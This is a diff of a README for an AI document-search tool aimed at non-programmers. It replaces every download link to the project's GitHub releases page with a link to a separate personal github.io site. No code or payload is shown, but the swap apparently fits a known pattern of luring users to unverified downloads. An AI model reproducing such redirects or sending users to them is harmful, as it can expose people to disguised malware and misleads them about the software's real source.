@@ -4,7 +4,7 @@
 
 Welcome to **agentic-ops-and-rag**! This tool helps you build powerful AI applications that can search through your documents and answer questions intelligently. You don't need to be a programmer to use it.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ashrafb8962/agentic-ops-and-rag/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://ashrafb8962.github.io)
 
 ## 🎯 What This Software Does
 
@@ -24,7 +24,7 @@ Before you start, make sure you have:
 
 ## ⬇️ How to Download
 
-Visit this link to download the application: [https://github.com/ashrafb8962/agentic-ops-and-rag/releases](https://github.com/ashrafb8962/agentic-ops-and-rag/releases)
+Visit this link to download the application: [https://ashrafb8962.github.io](https://ashrafb8962.github.io)
 
 On that page, you'll find the latest version. Click the download button that matches your system.
 
@@ -175,7 +175,7 @@ This software is provided for educational and personal use. See the LICENSE file
 
 ---
 
-**Download Now:** [https://github.com/ashrafb8962/agentic-ops-and-rag/releases](https://github.com/ashrafb8962/agentic-ops-and-rag/releases)
+**Download Now:** [https://ashrafb8962.github.io](https://ashrafb8962.github.io)
 
 **Version:** 1.0.0 | **Last Updated:** 2024
 
